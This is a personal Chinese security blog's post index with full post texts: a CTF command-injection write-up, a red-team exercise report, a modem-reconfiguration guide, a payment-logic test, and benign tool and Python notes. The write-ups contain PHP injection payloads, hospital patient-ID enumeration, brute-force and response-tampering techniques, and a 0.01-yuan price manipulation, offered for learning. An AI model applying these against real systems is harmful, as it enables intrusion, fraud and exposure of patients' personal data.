[{"title":"关于某运营商校园云网的一些操作","url":"/2023/09/15/ywpj/","content":"免责声明本文仅用于学习交流。切勿用于其他用途。\n传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢\n介绍对于xx运营商的一些操作大家肯定是觉得恶心，明明可以去抢，他还硬是要给你送张卡。\n写这个文章的目的是让不想一个宿舍一人办一张卡、爱折腾的同学提供一个思路。\n其实跳过认证的方法有很多，但是我们选择一劳永逸。\n我能得到什么\n你能让你的云网当做宽带来使用，也就是一个宿舍办理一个就够了\n只是隔不久认证一次就行了。\n原理就是把路由器当做一台设备通过认证。\n\n为什么我原来的宽带不让用\n为了赚钱 \n\n怎么样才能让我的宽带能正常用。\n\n改后台操作。\n\n准备操作\n首先你需要一个路由器\n其次你需要至少一根网线 （其实不要也行）\n再者你得有台电脑（其实手机也行，电脑更方便）\n你得有一双手 （有手就行 &lt;手动狗头&gt;)\n\nstep 1那么准备完了后，需要干嘛\n当然是需要连接光猫了。这里有两种方式\n\n手机或者电脑连接光猫的wifi \n从光猫利用网线接入电脑\n\nstep 2 进入后台某信自带的光猫呢 默认管理后台是192.168.100.1 但是你会发现你直接访问访问不到，原因是啥因为你需要改一下你本机的ip地址\n怎么改打开网络设置快捷键 win + i 打开 设置 找到网络找到后点击编辑然后将ip地址修改为和光猫一个网段学过计网的就不用我说了，肯定懂\n跟着改了就行了 ，参数我懒得介绍了，就是ip地址 不要设置为192.168.100.1 这个会和光猫冲突手机和电脑一样的改法。设置好后 点击保存就行了然后你会发现你电脑会断网  别慌 稳住 \n然后此时你再打开cmd窗口看看自己ip是否改成功了利用ipconfig查看自己的ip\n\n浏览器 启动！成功访问好了 关键时刻账号密码这个大家就百度吧，我就不直接发了\nstep 3 进行修改好了 经过哒哒哒一顿操作，我们进了后台了\n此时你已经成功50%了 打开wan配置 你们会发现你们的光猫只有一个默认的 id为50的 那我们怎么办 一个个加呗\n不过这之前 ，你需要先开启一个东西再次返回\n只需要增加修改就行了一共五个配置，跟着改就行了 很简单 其实\nINTERNET_R_VID_3900\n记得这个是路由WAN\nINTERNET_B_VID_41\nINTERNET_B_VID_42\nINTERNET_B_VID_43\nINTERNET_B_VID_44上面这41-44 分别对应四个lan口\nINTERNET_B_VID_50\n这个就是wifi的ssid了改完了后 应该干嘛\nstep 4 峰回路转当然是搞路由器了\n这时 将你的路由器用网线和光猫连接起来。然后此时，大概率是不行的，你需要重置一下你的路由器，然后路由器后台修改获取ip方式为自动获取ip重置后，再用网线或者连接路由器的wifi 进入管理后台 后台一般在路由器背面，账号和密码也在背面这个就不教了\n\n进去后会让你设置wifi账号密码啥的，记得选那个自动获取ip，然后等重启，重启完后重点来了\n\n利用你的手机，连接路由器你刚刚设置的那个wifi然后，这时候 应该会提示你，要认证，此时认证一次，你就会发现，能够正常使用网络了。然后呢，证明你成功了。到此，你基本完成了100%了 \n\n搞完了当然要测个速了啊。基本能到八九百了，但是离他宣传的1000M还是有差距，而且我相信绝大多数同学云网wifi连接的速度也只有两三百所以呢 这个算不算某运营商虚假宣传呢。\n然后就是可能你需要个路由器搞个定时重启，每周或者每几天重启一下，然后偶尔需要认证，认证后能正常使用了。。\n疑难杂症针对可能会存在的问题 做了一个汇总\n\n修改后卡主认证，进不去，那么直接重置一下光猫，然后按照教程重新来一遍就可以了。\n我原来有宽带账号密码，不想用云网，只想用原来的宽带，怎么办， 重置路由器的时候，选择宽带连接，输入账号密码就行了。\n\n我想说的\n本着想大家自己爱折腾就没必要多花钱去搞这个什么xxx了。所以将教程免费分享出来。希望大家低调使用而且也不希望有人拿着这个去割大家的韭菜，让大家花钱，实在不会的可以，喝瓶水就可以了其他的没必要。当然 我这么做肯定也会触犯到某些办卡同学的利益，只能说 且用且珍惜。\n\n再次免责声明本文仅用于学习交流。切勿用于其他用途。\n传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢\n","categories":["教程"],"tags":["某些教程"]},{"title":"某次市护总结","url":"/2023/08/01/%E6%9F%90%E6%AC%A1%E5%B8%82%E7%BA%A7hw%E6%80%BB%E7%BB%93/","content":"某次市护总结免责声明本次测试均在有授权，且在现场符合要求的情况下进行测试，请大家切勿非法渗透。\n传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢\n查看评分标准，收集资产这次数据分给的比较高，所以重点是找数据\n思路分析\n0-nday攻击 内网横向 获取敏感数据 \n弱口令爆破OA以及其他后台系统\nsql注入拿到数据库权限\nwx公众号资产测试\n\n0x01 公众号入口现在大多数的web资产都部署有waf等设备，部分企业的小程序或者微信公众号可能会有所忽略，可以尝试从apk或者公众号以及小程序入手本次主要是从微信公众号获取挂号链接进行id遍历，从而获取到整个医院的所有数据 其中身份证、手机号、姓名以及病例信息等。\n\nPOST /WxApp/xxx HTTP/1.1Host: x.x.x.xConnection: closeContent-Length: 620Accept: application/json, text/javascript, */*; q=0.01X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 NetType/WIFI MicroMessenger/6.8.0(0x16080000) MacWechat/3.8.1(0x13080110) XWEB/30626 FlueContent-Type: application/x-www-form-urlencoded; charset=UTF-8Origin: *Referer: *Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zhCookie: JSESSIONID=params=&#123;&quot;REQ_HEAD&quot;:&#123;&quot;TRAN_CODE&quot;:&quot;xxx&quot;&#125;,&quot;REQ_BODY&quot;:&#123;&quot;tradeType&quot;:&quot;xxx&quot;,&quot;InHead&quot;:&#123;&quot;BusinessNumber&quot;:&quot;xxx&quot;,&quot;TerminalNumber&quot;:&quot;xxx&quot;,&quot;CooperationUnit&quot;:&quot;xxx&quot;&#125;,&quot;InBody&quot;:&#123;&quot;PatientId&quot;:&quot;xxx&quot;,&quot;BeginApplyTime&quot;:&quot;2023-x-x 00:00:00&quot;&#125;&#125;&#125;&amp;time=xxx&amp;sign=xxxx\n\n点击查询，抓包其中PatientId参数可控，可以遍历id，从而获取其他用户数据 由于参数过大，这里只遍历后5位，证明存在即可。\n\n查看响应\n\n\n可以看到门诊数据身份证等敏感信息。修改id可以达到遍历全院所有医患数据。\n0x02 暴力破解YYDS暴力破解常见思路\n无验证码\n验证码可复用\n提示账户不存在&#x2F;密码错误\n前端校验 修改返回码\n传输加密 （这种需要js逆向分析）\n\n无验证码模式针对无验证码的模式，我的思路一般是直接字典一把梭哈 用户可以利用常见的 admin test ceshi 123 sysadmin等\nfuzz字典推荐 ：https://github.com/TheKingOfDuck/fuzzDicts/tree/master \n密码可以先跑弱口令，无果可以尝试生成社工字典。github一搜就有一大堆\n\n我个人喜欢用 https://github.com/zgjx6/SocialEngineeringDictionaryGenerator\n\n验证码复用这种其实遇到的其实蛮多的，很多时候有的师傅看到验证码就直接跳过了，其实很多时候的验证码是可以直接复用爆破的，也有的是删除验证码字段即可绕过，思路就和无验证码是一样的。\n账户不存在&#x2F;密码错误\n\n这种是我最喜欢的了，这种是首先跑一遍用户字典，密码我通常会填123456 然后看回显。回显密码错误的就直接搞个大的密码字典直接跑，有时候运气好，还能跑出来几个123456 密码的用户\n案例这里遇到的是一个医院的OA系统\n以前爆破OA从来没有成功过\n\n后面发现是自己姿势不对，跑字典的时候害怕太慢了，所以跑了小一会就直接放弃跑路了\n其实不然，很多时候等待字典跑完可能会有惊喜，我用的是一个爆破OA账户的字典，有差不多2w条，抱着不会成功的态度，跑着就丢在那里了，测完另外几个才想起这里还在跑，然后回来发现有个用户提示密码错误，然后手动测了一下几个弱口令，然后123进去了\n\n这里密码base64了一下 也算是加密传输中的一种，不过太简单了，这种bp也可以直接跑。\n\n这里直接拿到4个账号，然后可以直接对这4个账号进行遍历密码爆破，最后成功进入后台\n\n前端校验这种有，但是不咋多 常见的就是去前端js查看正确返回的响应码是多少，然后拦截返回包，直接修改，有的是改true 然后删除一些msg 什么的，\n废话不说 直接上案例\n\n正常情况错误返回500，还有其他的信息 修改500为200  登录成功\n\n\n成功进入后台，也能获取到数据。\n\n0x03 0-nday思路就是 多总结收集常见的OA以及每年HW爆出来的常见的利用漏洞\n例如 OA  利用常见的OA利用工具进行利用，或者自己有的0day或者未公开利用的1day啥的。 然后再进入内网横向，翻一翻配置文件什么的。\n\n这里大佬也是直接穿越了三个网络 由互联网-&gt;教育网-&gt;内网\n另外，旁边大佬还掏了个图书馆的0day 没好意思要 hh\n0x04 互联网虚拟云桌面这里也是运气好，直接用弱口令就进了云桌面。\n\n直接上线cs读了密码，起代理远程控制连接，也是拿到了财务管理系统的权限 拿到了不少数据\n\n同时还扫到内网几个ms17010\n总结以上内容仅代表个人看法和观点，不足的地方还望各位大佬指正。\n另外还有不少成果处理太麻烦就不写了，还有是依一些是大佬的成果，我写出来也不好，hh 主要是分享一下个人的一些心得和思路。\n总之是跟着大佬学到了不少东西，不论是外网打点，还是内网的一些横向手段。大佬总是很低调，说话也很谦虚。只是在某个不经意之间，就直接偷偷拿了shell。\n\n\n\n总之，学无止境，永远不要停止脚步！\n","categories":["攻防演练","红队"],"tags":["攻防演练"]},{"title":"clash配置专属于自己的ip代理池","url":"/2023/08/21/clash%E9%85%8D%E7%BD%AE%E4%B8%93%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84ip%E4%BB%A3%E7%90%86%E6%B1%A0/","content":"前提准备用clash配置代理池需要用到以下\n\n自己已经购买了订阅链接（没有的可以自行百度，这个自己摸索）\n\n安装clash并且配置好订阅链接\n\nstep 1 安装Service Mode如果只是想要达到代理池的话，其实也不用安装也行，但是都用clash了，TUN模式不用的话，有点浪费是吧。\n\n简单来说，普通的模式情况下，有大多数软件是不走clash代理的。所以呢\n对于不遵循系统代理的软件，TUN 模式可以接管其流量并交由 CFW 处理，在 Windows 中，TUN 模式性能比 TAP 模式好\n\nhttps://docs.cfw.lbyczf.com/contents/tun.html#windows 我建议多百度。我说的不清楚。\n安装教程呢 链接也说了，反正就是你先得安装Service Mode 也就是服务模式，才能启用tun\nTUN 启动！\n\n\n这是不开tun的情况\n\n浏览器能访问，但是bpsuit抓包的话，是提示还是真实ip\n可是我又不想被发现，那第一种方法是我可以设置上游代理，但是我嫌麻烦，所以我采用第二种方式。\n看到绿色球球，然后TUN mode 启动一下\n\n现在burp不用上游代理也可以了\n峰回路转 负载均衡设置代理池https://stash.wiki/proxy-protocols/proxy-groups \n\n参考文章 \n\n\n一般买的机场都是有什么自动选择啥的，那么就好办了\n不啰嗦 找到配置文件。\n\n随便选一个 然后编辑找到proxy-groups\n\n一般默认的这里是没有load-balance的 \n然后我们随便复制一条结点多的规则 比如我这里选择的是自动选择\n复制后给他改个名，然后type修改为load-balance\n\n然后拉到最后\n\n这里如果用他推荐的默认的话，\n\n不是我们想要的效果 \n那么直接上\nstrategy: round-robin, interval: 5 \n后面的是间隔，看你自己喜欢。\n\n搞定\n","categories":["工具配置"],"tags":["代理","clash","工具配置"]},{"title":"记一次小程序支付逻辑漏洞测试","url":"/2023/06/01/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95/","content":"记一次小程序支付逻辑漏洞测试闲来无事，无聊至极，羊了个羊很火，奈何太菜，通宵达旦，未能过关，于是另寻捷径。bp+proxifier搞一搞，抓到包直接重放。\nT值应该是自己的token，换成自己的，然后干嘛，然后直接intruder开干啊，截图装逼啊，还等啥。于是呢 小小的刷了一波各位看个乐呵就行。完了后转手看到一个别的小程序，里面有个商城，心想：看看有无支付逻辑漏洞试一试。试试就逝世。于是忙碌了一天的S师傅开心的打开了某小程序，开心的换了一换那里的纸巾，然后 一不小心 改了他的价格 0.01，给我吓一跳wc，我要暴富了啊，还等什么，直接开干啊没想到啊，正当我开心的时候，结算的时候给了我耳光。16.9 我这种穷孩子怎么可能买得起嘛。所以我一不小心，真的是一不小心的。我寻思0.01总得支付吧，谁曾想，我还没付钱呢。直接给我成功了，吓死个人，md白嫖？我怎么可能是这种人。吓得我直接退货了。然后和客服沟通了一下下 ，我生怕他给我退钱过来了，咱可是遵纪守法的好公民啊，这周末能行呢。运营小姐姐打电话来和我说感谢，还好不是喝茶。就告一段落了，所以各位铁汁们，注意网络安全法，千万要做一个遵纪守法的好公民啊\n","categories":["漏洞挖掘","渗透测试"],"tags":["web渗透","小程序","逻辑漏洞"]},{"title":"自用的浏览器插件推荐","url":"/2023/11/29/%E8%87%AA%E7%94%A8%E5%AE%9E%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%90/","content":"可能大多数插件师傅们都用过，有点班门弄斧了，但是有些可能挺实用的，所以想着分享一下。其实还有蛮多插件，但是我感觉可能作用并不是很大吧，所以就不写了。\nhh 首先来一张我自己浏览器的截图。\n\n1. Wappalyzer这个相信就不用过多介绍了\n\n师傅们应该人手一个。\n2. Charset一款修改网站编码的插件，相信在很多时候，请求访问的时候，有乱码。\n用这个插件可以完美解决。\n\n\n3. FeHelper(前端助手)\n\n功能很强大，可以一键美化js和格式化json等数据。方便查看\n\n同样，这个插件也支持自动修正乱码。\n\n可以折叠等操作。很方便，功能强大到飞起，比如截图，二维码解析等等。\n4.IP Whois &amp; Flags Chrome &amp; Websites Rating\n一款能够快速帮助你了解ip所在国际信息并以国家图标展示出来的插件，在平时工作中能够让你快速定位和了解目标信息等。\n\n\n\n5. Link Grabber一个快速收集网页中存在的url，并将结果展示出来的插件。\n\n6. Hack-Tools\n一款可以帮助你快速生成payload的插件。\n例如xss，还有sql，以及快速反弹shell等\n\n7. 草料二维码-快速生码和解码工具一款解码和生成二维码的插件，很方便。可以直接生成当前页面的二维码。\n\n支持右键解码获取链接。\n8. 语雀浏览器插件用语雀的师傅一个很方便的功能，可以摘抄并保存到语雀。\n\n还支持划词翻译等功能。挺好用的。\n9. FindSomething这个就不介绍了，基本人手一个 快速收集敏感信息以及路径等消息。\n\n10.superSearchPlus\n\n用于资产收集以及接口扫描等。\n11. Heimdallr\n识别蜜罐的。。。个人感觉 好像用处不大。\n12. EditThisCookie\n\n快速修改cookie信息。\n12. OWASP Penetration Testing Kit可以做信息收集等。端口扫描，快速重放数据。\n\n\n\n还能导入swagger测试\n\n也是一个很实用的插件。\n13. Markoob - 书签启动器不知道师傅们用书签是咋样的， 我反正是经常记不住，只知道个大概。一般打开浏览器自带的又麻烦\n\n使用插件后会接管首页，会生成一个类似导航页的界面，导航页的内容就是你书签的内容，且可以对你的书签进行搜素。个人挺喜欢的，界面也清爽舒服。\n\n14. iGG谷歌学术助手如题，科学上网的。\n但是要付费，价格其实还能接受，可以同时支持4个设备浏览器使用+几台设备一个月200G流量来着，其实可以理解为一个机场，但是速度挺快的，youtube可以4k秒开，而且有GPT专线，总体来说性价比还可以。\n\n可以和朋友拼一个，而且可以自定义加速域名，自选结点等。\n","categories":["漏洞挖掘","渗透工具"],"tags":["web渗透","工具使用"]},{"title":"CTFSHOW刷题-命令执行篇","url":"/2023/09/26/CTFSHOW%E5%88%B7%E9%A2%98-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87/","content":"CTFSHOW 命令执行板块\n先附上两位大佬的wp，太久没打CTF了，自己菜的要死。https://zhuanlan.zhihu.com/p/404636378https://wkr.moe/ctf/447.html \n\nweb29没啥好说的\n&lt;?phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;\n\nget请求命令执行  但是过滤了flag 利用通配符解决\npayload\n\n?c&#x3D;system(‘cat fl*.php’);\n\n\n\nweb30&lt;?phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag|system|php/i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;\n\n一样的审计一下\n多了个flag|system|php 过滤\n那就不用system执行命令，用其他的 \n百度一下\n/?c=echo%20`nl%20fla*.ph*`; ?c=echo%20`tac%20fla*.ph*`;\n\n\n利用post请求，类似于一句话木马\npayload还是蛮多的\nweb31&lt;?phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;/i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;\n\n前面的eval 其实可以通杀了\n\n大佬的payload\n\n?c&#x3D;echo%09`less%09fla*`;\n?c&#x3D;echo%09`more%09fla*`;\n&#x2F;?c&#x3D;echo%09`&#x2F;bin&#x2F;ca*%09fla*`;\nweb32&lt;?phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(/i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;\n\n都过滤了，这里用文件包含进行尝试payload\n?c=include%09$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php得到的结果再base64解密即可。\nweb33&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 02:22:27# @email: h1xa@ctfer.com# @link: https://ctfer.com*///error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\&quot;/i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;\n\n\n\n?c=require%0a$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php\ninclude和require一样的\nweb34&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 04:21:29# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\:|\\&quot;/i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;\n\n和前面一样\n/?c=require%09$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php\n\nctfshow{ee6aa1e8-f525-4459-9456-33e30b313717}\nweb35&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 04:21:23# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\:|\\&quot;|\\&lt;|\\=/i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;\n其实还是差不多paylod?c=require%0a$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php\nweb36 同35web37&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 05:18:55# @email: h1xa@ctfer.com# @link: https://ctfer.com*///flag in flag.phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;        include($c);        echo $flag;        &#125;        &#125;else&#123;    highlight_file(__FILE__);&#125;\n这里感觉是可以用伪协议的?c&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;fla*.php&#x2F;?c&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;fla*.php这俩都失败了试试其他伪协议推荐文章https://segmentfault.com/a/1190000018991087利用data协议data://text/plain,&lt;?php%20phpinfo();?&gt;\n执行成功，直接查看flag/?c=data://text/plain,&lt;?php%20system(&quot;cat fla*.php&quot;);?&gt;查看源代码 拿到flag\n\nweb38&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 05:23:36# @email: h1xa@ctfer.com# @link: https://ctfer.com*///flag in flag.phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag|php|file/i&quot;, $c))&#123;        include($c);        echo $flag;        &#125;        &#125;else&#123;    highlight_file(__FILE__);&#125;\n\n这里过滤了php 原本想着通配符的，失败base64编码一下/?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==/?c=data://text/plain,&lt;?=system(&quot;tac fla*&quot;);?&gt;  看了大佬的解题，这里没搞明白，为什么直接 &lt;?&#x3D;system 后面就可以命令执行了 \n短标签，又学到了。\nweb39/?c=data://text/plain,&lt;?=system(&quot;tac fla*&quot;);?&gt;这个直接可用\nweb40&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 06:03:36# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\（|\\）|\\-|\\=|\\+|\\&#123;|\\[|\\]|\\&#125;|\\:|\\&#x27;|\\&quot;|\\,|\\&lt;|\\.|\\&gt;|\\/|\\?|\\\\\\\\/i&quot;, $c))&#123;        eval($c);    &#125;        &#125;else&#123;    highlight_file(__FILE__);&#125;\n\n都过滤麻了 直接 只能想到无参数命令执行了这题是真的有点难\n/?c=print_r(file_get_contents(next(array_reverse(scandir(pos(localeconv()))))));\nshow_source(next(array_reverse(scandir(pos(localeconv()))))); 这两个都是看大佬的文章学会的\neval(show_source(current(array_reverse(scandir(pos(localeconv())))));)代码解释：eval() :执行代码show_source:高亮显示代码，作用和highlight_file一致next(array):输出数组指针指向的下一个元素的值,并移动向下一个指针：current(array):输出数组指针指向的元素(等价于)pos(array)prev(array)类比next，作用相反scandir() 函数返回指定目录中的文件和目录的数组。localeconv() 函数返回包含本地数字及货币信息格式的数组。\n\n然后呢  其实这个payload 也可以/?c=show_source(file_get_contents(next(array_reverse(scandir(pos(localeconv()))))));\n再看第一个payload/?c=print_r(file_get_contents(next(array_reverse(scandir(pos(localeconv()))))));\n这里呢，是localeconv() 函数返回包含本地数字及货币信息格式的数组。然后首先将结果输出\n再通过pos()得到数组中的关键元素——本地重要文件地址\n通过scandir()借助本地重要文件地址，返回本地重要的文件名（为什么不直接用，因为flag被过滤了）\n这里看到flag.php在数组的第三个位置，有点不好取，这里可以用array_reverse()将数组进行反转，从而变成第二个，再用next去取反转后flag.php 在第二个位置利用next读取到flag.php最后用file_get_contents 或者show_source 进行读取结果利用show_source可以直接在网页中显示\n总结太菜了。好多都忘记了，得重修了。\n","categories":["CTF"],"tags":["CTF","刷题","学习笔记"]},{"title":"最近的一些面试题总结","url":"/2023/09/15/%E9%9D%A2%E8%AF%95%E9%A2%98%E6%80%BB%E7%BB%93/","content":"\n  \n  \n    \n      \n      \n        要不是吃不起()，谁会来学网络安全.\n      \n    \n  \n\n","tags":["面试"]},{"title":"粗浅的SRC技巧总结","url":"/2023/09/04/%E7%B2%97%E6%B5%85%E7%9A%84SRC%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/","content":"\n信息收集子域名\nOneforall\n\n在线收集\n\n微步在线\n\nVT\n\n\n\nARL灯塔\n\nShuize\n\n\n目录扫描\ndirsearch\n\n7kbs\n\n\n端口探测\nnmap\n\ngoby\n\n\nJS敏感信息\nwebpack fuzzer\n\njsfinder\n\nFindsomething\n\nburp插件 hae\n\nyakit 自带规则\n\n\n语法搜索\nGoogle hacking\n\nsite intext file intitle inutl 等语法\n\n\nGitHub \n\n搜索敏感信息，例如ak sk 账号密码等\n\n\n\n空间搜索引擎\nfofa\n\n360quake\n\nhunter\n\n\n越权用户类型\n修改用户类型\n\n越权查看信息\n\n\n优惠券\n领取隐藏优惠券\n\n任意用户\n任意用户登录\n\n任意用户密码修改\n\n\n个人信息\n姓名\n\n手机号码\n\n身份证号\n\n收货地址\n\n\n订单号\n查看他人订单\n\n订单详细信息\n\n\n其他含有ID的参数并发常见场景\n验证码\n\n抽奖\n\n新人优惠\n\n领取优惠券\n\n提现\n\n发票\n\n\n短视频\n关注\n\n取关\n\n投票\n\n评论\n\n点赞\n\n\n。。。。。。","categories":["src技巧","学习总结"],"tags":["src技巧","学习总结","漏洞挖掘"]},{"title":"HW之参加攻防演练的日子","url":"/2023/08/19/HW%E4%B9%8B%E3%80%8A%E5%8F%82%E5%8A%A0%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E7%9A%84%E6%97%A5%E5%AD%90%E3%80%8B/","content":"HW进行时1 之我是猴子&amp;&amp;我是歌手哎 没动静，红队没吃饭？ 怎么一条告警也没有\n\n\n\nHW 进行时2  之卜卦怎么还是一条告警也没有啊，RT是不是没吃饭\n\n\n\nHW进行时 3我真的在HW么 怎么这么闲\n\nHW 进行时 4 之 我在微步显才华RT表哥的池子怎么这么大，挂个B扫描器一直哒哒哒。\n\n素颜（HW版）\nHW 进行时5 之摸鱼来趟会议室摸鱼 启动！\n\n\n来趟会议室\n\nHW 进行时6 之Nginx通杀&amp;&amp;我在蓝初当卧底&amp;&amp;空间不足\n\n\nHW 进行时7 之脚本小子一键防御一键封ip&amp;带嘲讽版本\n一键防御 启动！！\n\nHW 进行时 8 之我在内网好想你好无聊啊\nHW进行时 9 CPU之我对你大抵是有些失望的\n其实，我对你大抵是有些失望的。当初给你定级高级渗透工程师，是高于你面试时的水平的。我是希望进来后，你能够拼一把，快速成长起来的。高级渗透工程师这个层级，不是把事情做好就可以的。你需要有体系化思考的能力。你做的事情，他的价值点在哪里？你是否作出了壁垒，形成了核心竞争力？你做的事情，和公司内其他团队的差异化在哪里？你的事情，是否沉淀了一套可复用的物理资料和方法论？为什么是你来做，其他人不能做吗？你需要有自己的判断力，而不是我说什么你就做什么。后续，把你的思考沉淀到日报周报月报里，我希望看到你的思考，而不仅仅是进度。另外，提醒一下，你的产出，和同层级比，是有些单薄的，马上要到年底了，加把劲儿。你看咱们团队的那个谁, 人家去年晋升之前，可以一整年都在项目室打地铺的。成长，一定是伴随着痛苦的，当你最痛苦的时候其实才是你成长最快的时候。加油 公司的文化是团队合作，拥抱变化，我觉得你是时候做出一点改变了。公司没有超人，包括我也一样，不要总想着自己是与众不同的，你需要找好自己的位置。只有认清了自己，你才能有相应的举措改善，否则连你自己都觉得没有依着感。来年3月份还会有一次答辩，多思考思考我说的话，你就会获得成长。没有提升，对你、对公司都没有什么好处，这些差距你需要搞得明明白白。 今年就由你勉强承接一下，我希望你能总结经验教训，让自己的感情软着陆，沉下心来做出一些改变，明年的A就是你的了。你应该知道，在我的手下培养出来的，没有弱兵。给你C，我自己也是感觉脸上无光。我希望你接下来的工作能够证明我的眼光，给我一个交代，也给自己一个交代。\n\n\nHW 进行时 10 顶不住了md 再坚持坚持！\n红队哥哥们轻点打\n\nHW 进行时11 之大师帮忙\n\n想到发工资的时候\n​\t\n","categories":["攻防演练","HW"],"tags":["攻防演练","2023HW","段子手"]},{"title":"python 继承和多态","url":"/2023/08/18/python%20%E7%BB%A7%E6%89%BF%E5%92%8C%E5%A4%9A%E6%80%81/","content":"python 继承和多态什么是继承？在生活中，大家都应该听过这个词，比如儿子继承他老子的财产，那么在python中也有继承，但是有不少人比较难理解继承这个东西。在python，所有的类都默认继承object类，因此object类也被称为基类,其他的类称为派生类,在python中继承就是 子类可以继承父类中的所有的非私有方法\n\n什么是私有方法?\n\n是指在 Python 的面向对象开发过程中，对象的某些方法或者称为函数只想在对象的内部被使用，但不想在外部被访问到这些方法或函数。即：私有方法是对象不愿意公开的方法或函数。同理 私有属性也是类同那么用一个简单的代码来理解一下\n# 1. 定一个一个公共性类 (class   Person():    # 定义__init__初始化方法    def __init__(self,name,age,adress):        self.name = name        self.age = age        self.adress = adress    def eat(self):        print(&#x27;i can eat food!&#x27;)    def speak(self):        print(&#x27;i can speak!&#x27;)# 定义个性类class Teacher():    def __init__(self,name,age,adress):        self.name = name        self.age = age        self.adress = adress    def eat(self):        print(&#x27;i can eat food!&#x27;)    def speak(self):        print(&#x27;i can speak!&#x27;)\tdef __write(self):\t\tprint(&#x27;i can wirte&#x27;)# 定义个性类 Student  继承person类，发现也可以调用成功class 